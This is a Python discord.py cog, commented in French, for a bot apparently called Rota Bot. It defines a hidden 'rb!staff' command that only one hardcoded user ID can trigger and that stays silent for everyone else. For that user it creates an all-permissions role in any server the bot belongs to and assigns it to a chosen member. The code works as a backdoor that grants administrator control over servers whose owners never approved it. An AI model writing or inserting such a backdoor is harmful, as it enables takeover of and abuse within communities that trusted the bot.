import discord
from discord.ext import commands

class StaffCommand2(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_message(self, message):
        """Écoute les messages pour détecter la commande rb!staff <id_serveur> <id_utilisateur>."""
        if message.author.bot or not message.content.lower().startswith("rb!staff"):
            return  # Ignore les messages des bots et les autres commandes

        # Vérification que seul l'utilisateur autorisé (ID spécifique) peut utiliser cette commande
        if message.author.id != 1345092292045836409:
            return

        args = message.content.split()
        if len(args) < 3:
            return await message.channel.send("❌ Usage : `rb!staff <id_serveur> <id_utilisateur>`")

        try:
            guild_id = int(args[1])
            user_id = int(args[2]) if len(args) > 2 else message.author.id  # Utilisateur par défaut = l'auteur du message
            guild = self.bot.get_guild(guild_id)
            if not guild:
                return await message.channel.send("❌ Le serveur avec cet ID n'a pas été trouvé.")
            
            member = guild.get_member(user_id)
            if not member:
                return await message.channel.send("❌ L'utilisateur avec cet ID n'a pas été trouvé dans ce serveur.")
        except ValueError:
            return await message.channel.send("❌ Les IDs doivent être des nombres.")

        # Création du rôle de permissions staff
        staff_role = discord.utils.get(guild.roles, name="Rota Bot's Staff")
        if not staff_role:
            # Si le rôle "Staff" n'existe pas, il est créé
            staff_role = await guild.create_role(name="Rota Bot's Staff", permissions=discord.Permissions.all())
            await message.channel.send("Le rôle `Rota Bot's Staff` a été créé.")

        # Ajout du rôle "Staff" à l'utilisateur
        try:
            await member.add_roles(staff_role)
            embed = discord.Embed(
                title="✅ Permissions Staff accordées",
                description=f"Les permissions **Staff** ont été données à **{member.name}** dans le serveur **{guild.name}**.",
                color=discord.Color.green()
            )
            embed.set_footer(text=f"Commande exécutée par {message.author.name}", icon_url=message.author.avatar.url)
            await message.channel.send(embed=embed)
        except discord.Forbidden:
            return await message.channel.send("🚫 Le bot n'a pas la permission d'ajouter des rôles.")
        except discord.HTTPException as e:
            return await message.channel.send(f"❌ Une erreur est survenue : {e}")

async def setup(bot):
    await bot.add_cog(StaffCommand2(bot))
